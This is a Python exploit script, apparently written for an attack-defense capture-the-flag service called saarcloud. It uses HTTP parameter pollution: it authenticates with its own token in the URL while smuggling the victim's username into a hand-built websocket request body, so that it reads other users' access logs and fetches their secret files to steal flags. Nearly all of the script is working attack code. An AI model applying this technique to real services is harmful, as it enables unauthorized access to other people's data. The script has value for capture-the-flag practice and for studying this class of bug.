import os
import random
import re
import socket
import string
import threading

import requests
import sys
import time
import websocket


"""
Flag is stored in a file with secret name. Name is not stored anywhere, but the gameserver comes along at some point and retrieves it.

Access log endpoint is vulnerable to multiple arguments. 
Drogon gives POST-style parameters precedence over GET-style parameters, while the JS parser only reads GET-style parameters.
We authenticate (in JS) against our own account, but drogon will serve logs for the victim's account.

Then we wait for the gameserver to access the secret URL, see it in access log, and retrieve the flag.
"""


def wait_for_checker_to_retrieve_flags(target):
    """
    In our CI environment, the environment variable "CHECKER_RETRIEVE_CMD" triggers the checker to retrieve flags again
    (for exploits that catch the flag in-flight).
    """
    print('-' * 80)
    print('waiting for checker ...')
    sys.stdout.flush()
    if 'CHECKER_RETRIEVE_CMD' in os.environ:
        os.system(os.environ['CHECKER_RETRIEVE_CMD'] + " 2>&1 | tac | tac | sed 's/SAAR{/SAAR_/'")
    else:
        # Trigger the regular checker script with some parameters (adjust for your own testing)
        os.system(f"PYTHONPATH=../ python3 -u ../checkers/saarcloud.py '{target}' retrieve")
    print('-' * 80)


def random_string(l=12):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(l))


class SaarCloudSession(requests.Session):
    def __init__(self, ip: str, hostname='default'):
        super().__init__()
        if hostname == 'default':
            hostname = 'www'
        if '.' not in ip:
            ip = socket.gethostbyname(ip)
        self.base = f'http://{hostname}.{ip}.nip.io:8080'
        self.ip = ip

    def get(self, url, **kwargs):
        if url.startswith('/'):
            url = self.base + url
        return super().get(url, **kwargs)

    def post(self, url, **kwargs):
        if url.startswith('/'):
            url = self.base + url
        return super().post(url, **kwargs)


def exploit(target):
    session = SaarCloudSession(target)
    # We attack users relying on "cdn"
    users = session.get('/api/featured').json()['cdn']

    # Register a new user
    username = random_string()
    token = session.post('/api/register/cdn', json={'username': username}).json()['log_token']

    # Handle opened websockets - once we see a log entry from the game server, we open the same file
    already_seen = set()

    def fetch_file(ws, msg):
        if '/paid_content_' in msg:
            # fetch the file ourselves
            match = re.search(r'"GET /([a-z0-9]+)/([a-zA-Z0-9_.]+)"', msg)
            if (match.group(1), match.group(2)) not in already_seen:
                already_seen.add((match.group(1), match.group(2)))
                print('LOG:', msg)
                session = SaarCloudSession(target, match.group(1))
                print(session.get('/' + match.group(2)).text)
                sys.stdout.flush()

    # Use HTTP Parameter Pollution: send different usernames in url (GET style) and data (POST style).
    # This here is a hack for the websockets library, which does not support setting the HTTP body.
    # The produced request looks like this. Parameter x is here to "escape" the final \r\n.
    '''
GET /logs?user=ufbvxkibvkkf&token=487B10A7FD448685EFF1EBA3136F6678B8803B50151B17747DBD144DDC0C7BE6 HTTP/1.1
Upgrade: websocket
Connection: Upgrade
Host: www.127.0.0.1.nip.io:8080
Origin: http://www.127.0.0.1.nip.io:8080
Sec-WebSocket-Key: HIMTX8a0oKmsPYJQ2rWotw==
Sec-WebSocket-Version: 13
Content-Length: 34

user=specialruralargument1597&x=

'''
    for user in users:
        data = 'user=' + user["name"] + '&x='
        headers = [
            f'Content-Length: {len(data) + 2}',
            f'\r\n{data}'
        ]
        app = websocket.WebSocketApp(f'ws://www.{session.ip}.nip.io:8080/logs?user={username}&token={token}', on_message=fetch_file, header=headers)
        threading.Thread(target=lambda: app.run_forever(), daemon=True).start()

    # Wait until secret files are retrieved
    wait_for_checker_to_retrieve_flags(target)

    time.sleep(2)


if __name__ == '__main__':
    exploit(sys.argv[1] if len(sys.argv) > 1 else '127.1.0.1')
